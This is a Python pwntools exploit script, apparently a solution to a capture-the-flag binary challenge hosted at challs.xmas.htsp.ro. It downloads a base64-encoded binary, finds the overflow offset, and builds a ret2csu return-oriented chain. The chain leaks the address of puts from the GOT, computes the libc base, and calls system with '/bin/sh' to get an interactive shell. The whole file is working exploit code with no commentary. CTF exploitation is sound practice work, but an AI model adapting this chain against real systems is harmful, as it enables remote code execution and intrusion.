from pwn import *

import os, base64
import subprocess

r = remote("challs.xmas.htsp.ro", 12002)

#input("")
context.arch = 'amd64'
context.os = 'linux'




binary = (r.recvuntil("name? "))
b64 = binary[84:-23]
strb64 = (b64.decode(encoding='UTF-8'))

f = open("exec", 'wb')
f.write(base64.b64decode(strb64))
f.close()

inpu = input("cyclic:")
cnt = cyclic_find(inpu)
csu_head = int(input("csu_head:"), 16)
puts_got = int(input("puts_got:"), 16)

print(cnt, hex(csu_head), hex(puts_got))

csu_head = 0x403670
csu_reset = csu_head + 0x1a 
puts_got = 0x605018
gets_got = puts_got + 0x20
pop_rsp_pop3_ret = csu_head + 0x1d
ret = 0x4005a6

puts_off = 0x809c0
sys_off  = 0x4f440

payload = b"b" * (cnt) + flat([csu_reset, 0, 1, puts_got, puts_got, 0, 0, csu_head, 0])
payload += flat([0, 1, gets_got, 0x605800, 0, 0, csu_head, 0])
payload += flat([0, 0, 0, 0, 0, 0, pop_rsp_pop3_ret, 0x605800])


r.sendline(payload)
recv = r.recv()
print(recv)
libc = u64(recv[-7:-1] + b"\x00\x00") - puts_off
print(hex(libc))

system = libc + sys_off

payload = flat([0, 0, 0, ret, csu_reset])
payload += flat([0, 1, 0x605860, 0x605868, 0, 0, csu_head, system ,"/bin/sh\x00"])
r.sendline(payload)
r.interactive()



